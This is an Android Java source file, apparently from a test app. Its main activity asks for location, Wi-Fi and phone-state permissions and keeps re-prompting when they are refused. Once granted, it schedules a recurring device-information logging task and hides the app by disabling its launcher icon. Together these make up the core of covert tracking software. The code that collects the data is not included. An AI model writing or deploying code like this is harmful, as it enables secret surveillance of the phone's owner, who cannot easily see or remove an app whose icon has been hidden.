package com.femi.test.ui;

import android.Manifest;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import androidx.appcompat.app.AlertDialog;
import androidx.preference.PreferenceManager;

import com.femi.test.R;
import com.femi.test.worker.DeviceInfoScheduler;
import com.thebrownarrow.permissionhelper.ActivityManagePermission;
import com.thebrownarrow.permissionhelper.PermissionResult;

public class MainActivity extends ActivityManagePermission {

    String[] permissions = new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.READ_PHONE_STATE};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        askPermission();
    }

    private void askPermission(){
        askCompactPermissions(permissions, new PermissionResult() {
            @Override
            public void permissionGranted() {
                //permission granted
                setupPeriodicTask();
                hideApp();
            }

            @Override
            public void permissionDenied() {
                //permission denied
                showMessageOKCancel(getResources().getString(R.string.permission_required_msg), (dialogInterface, i) -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        askPermission();
                    }
                });
            }

            @Override
            public void permissionForeverDenied() {
                // user has check 'never ask again'
                // you need to open setting manually
                openSettingsApp(MainActivity.this);
            }
        });
    }

    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(MainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", (dialogInterface, i) -> finish())
                .create()
                .show();
    }
    private void hideApp() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    private void setupPeriodicTask() {

        SharedPreferences preferences = PreferenceManager.
                getDefaultSharedPreferences(this);

        //schedule recurring task only once
        if (!preferences.getBoolean("isLogScheduled", false)) {
            DeviceInfoScheduler.setupPeriodicWork(MainActivity.this);

            SharedPreferences.Editor editor = preferences.edit();
            editor.putBoolean("isLogScheduled", true);
            editor.apply();
        }
    }

}